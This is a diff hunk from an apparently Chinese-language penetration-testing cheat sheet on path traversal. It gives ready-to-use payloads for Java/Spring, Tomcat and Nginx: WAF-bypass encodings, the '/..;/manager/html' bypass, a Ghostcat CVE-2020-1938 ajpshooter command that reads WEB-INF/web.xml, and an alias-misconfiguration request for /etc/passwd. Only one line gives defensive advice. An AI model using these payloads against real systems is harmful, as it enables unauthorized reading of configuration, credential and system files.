@@ -77,7 +77,7 @@
 
 **Java/Spring**：`ClassPathResource(input)`/`getResourceAsStream("/x/"+input)` 拼接；读 `../WEB-INF/web.xml`、`classes/application.properties`；静态资源 `/static/..%252f..%252fWEB-INF/web.xml`。**WAF 拦字面 ../ 时的 Ghost 变体**: `阮阮阯`（窄化还原 ../）、Jetty `%2>` 折叠 `%2E`、Spring CVE-2025-41242 `阮严灵丰丰甲来`→`.%u002e`→`..`（限定条件见 `ghost-bits-cast-attack.md` §4.4）。
 
-**Tomcat**：`/..;/manager/html`——`;` 到 `/` 间被当路径参数剥离，反代不剥 → 绕过；`/%252e%252e/` 双重解码；**Ghostcat CVE-2020-1938**（AJP 8009 暴露）：`ajpShooter.py ... /WEB-INF/web.xml read`；eval 模式经 `javax.servlet.include.servlet_path` 包含已上传文件执行（Tomcat<9.0.31 无 secretRequired）。
+**Tomcat**：`/..;/manager/html`——`;` 到 `/` 间被当路径参数剥离，反代不剥 → 绕过；`/%252e%252e/` 双重解码；**Ghostcat CVE-2020-1938**（AJP 8009 暴露）：`ajpshooter http://T:8009 /WEB-INF/web.xml read`（AJP FORWARD 请求的 javax.servlet.include.* 属性传路径）；eval 模式经 `javax.servlet.include.servlet_path` 包含已上传文件执行（Tomcat<9.0.31 无 secretRequired）。
 
 **Nginx alias 错配**：`location /assets { alias /data/; }`（location 缺尾斜杠）→ `GET /assets../etc/passwd` = `/data/../etc/passwd`。规则：alias 与 location 结尾斜杠必须一致。
 
